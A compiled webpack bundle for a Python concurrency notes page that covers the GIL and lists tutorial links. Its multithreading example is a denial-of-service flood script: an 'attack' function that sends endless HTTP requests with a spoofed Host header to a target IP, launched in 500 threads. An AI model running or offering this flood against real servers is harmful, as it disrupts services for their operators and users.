"use strict";(self.webpackChunkdeep_notes=self.webpackChunkdeep_notes||[]).push([[87640],{202473:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>s,contentTitle:()=>i,default:()=>d,frontMatter:()=>a,metadata:()=>r,toc:()=>h});const r=JSON.parse('{"id":"python/advanced/concurrency","title":"Concurrency","description":"Global Interpreter Lock (GIL)","source":"@site/docs/python/advanced/concurrency.md","sourceDirName":"python/advanced","slug":"/python/advanced/concurrency","permalink":"/python/advanced/concurrency","draft":false,"unlisted":false,"editUrl":"https://github.com/deepaksood619/deepaksood619.github.io/tree/master/docs/python/advanced/concurrency.md","tags":[],"version":"current","lastUpdatedBy":"Deepak","lastUpdatedAt":1705054005000,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Architecture","permalink":"/python/advanced/architecture"},"next":{"title":"CPython","permalink":"/python/advanced/cpython"}}');var o=t(474848),c=t(28453);const a={},i="Concurrency",s={},h=[{value:"Global Interpreter Lock (GIL)",id:"global-interpreter-lock-gil",level:2},{value:"MultiThreading",id:"multithreading",level:2},{value:"Links",id:"links",level:2}];function l(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.header,{children:(0,o.jsx)(n.h1,{id:"concurrency",children:"Concurrency"})}),"\n",(0,o.jsx)(n.h2,{id:"global-interpreter-lock-gil",children:"Global Interpreter Lock (GIL)"}),"\n",(0,o.jsx)(n.p,{children:"GIL is a mutex that protects access to Python objects, preventing multiple threads from executing Python bytecodes at once. This lock is necessary mainly because CPython's memory management is not thread-safe."}),"\n",(0,o.jsx)(n.p,{children:"This essentially means that a process can run only one thread at a time. When a thread starts running, it acquires GIL and when it waits for I/O, it releases the GIL, so that other threads of that process can run."}),"\n",(0,o.jsx)(n.p,{children:"Solution - Run multiple Python instances"}),"\n",(0,o.jsx)(n.h2,{id:"multithreading",children:"MultiThreading"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",children:"import threading\n\nimport socket\n\ntarget = '10.0.0.138'\n\nport = 80\n\nfake_ip = '182.21.20.32'\n\ndef attack():\n\nwhile True:\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ns.connect((target, port))\n\ns.sendto((\"GET /\" + target + \" HTTP/1.1rn\").encode('ascii'), (target, port))\n\ns.sendto((\"Host: \" + fake_ip + \" rnrn\").encode('ascii'), (target, port))\n\ns.close()\n\nfor i in range(500):\n\nthread = threading.Thread(target=attack)\n\nthread.start()\n"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.a,{href:"https://bovage.hashnode.dev/what-exactly-is-multithreading",children:"https://bovage.hashnode.dev/what-exactly-is-multithreading"})}),"\n",(0,o.jsx)(n.h2,{id:"links",children:"Links"}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.a,{href:"https://wiki.python.org/moin/GlobalInterpreterLock",children:"https://wiki.python.org/moin/GlobalInterpreterLock"})}),"\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.a,{href:"https://pybay.com/site_media/slides/raymond2017-keynote/index.html",children:"https://pybay.com/site_media/slides/raymond2017-keynote/index.html"})}),"\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.a,{href:"https://www.youtube.com/watch?v=9zinZmE3Ogk&index=2&list=WL&t=0s",children:"Raymond Hettinger, Keynote on Concurrency, PyBay 2017"})}),"\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.a,{href:"https://realpython.com/python-concurrency",children:"https://realpython.com/python-concurrency"})}),"\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.a,{href:"https://www.toptal.com/python/beginners-guide-to-concurrency-and-parallelism-in-python",children:"https://www.toptal.com/python/beginners-guide-to-concurrency-and-parallelism-in-python"})}),"\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.a,{href:"https://www.tutorialspoint.com/concurrency_in_python/index.htm",children:"https://www.tutorialspoint.com/concurrency_in_python/index.htm"})}),"\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.a,{href:"https://www.youtube.com/watch?v=18B1pznaU1o",children:(0,o.jsx)(n.strong,{children:"Tutorial: Santiago Basulto - Python Concurrency: from beginner to pro"})})}),"\n",(0,o.jsxs)(n.li,{children:[(0,o.jsx)(n.a,{href:"https://youtu.be/5pYKAoD3Apk",children:"Back to Basics: Concurrency"})," - C++"]}),"\n"]})]})}function d(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(l,{...e})}):l(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>i});var r=t(296540);const o={},c=r.createContext(o);function a(e){const n=r.useContext(c);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:a(e.components),r.createElement(c.Provider,{value:n},e.children)}}}]);